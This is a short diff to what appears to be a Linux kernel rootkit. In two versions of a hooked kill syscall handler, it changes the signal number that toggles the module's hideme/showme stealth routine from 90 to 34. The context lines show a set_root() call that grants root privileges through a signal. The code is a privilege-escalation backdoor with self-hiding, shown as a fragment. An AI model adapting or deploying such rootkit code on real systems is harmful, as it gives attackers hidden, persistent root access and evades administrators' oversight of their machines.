@@ -336,7 +336,7 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 			set_root();
 			return 0;
         // #ifdef HIDE_MODULE
-        case 90:
+        case 34:
             if (hidden == 0) {hideme(); return 0;}
             else {showme(); return 0;}
         // #endif
@@ -518,7 +518,7 @@ asmlinkage int hook_kill(pid_t pid, int sig)
 			set_root();
 			return 0;
         // #ifdef HIDE_MODULE
-        case 90:
+        case 34:
             if (hidden == 0) {hideme(); return 0;}
             else {showme(); return 0;}
         // #endif
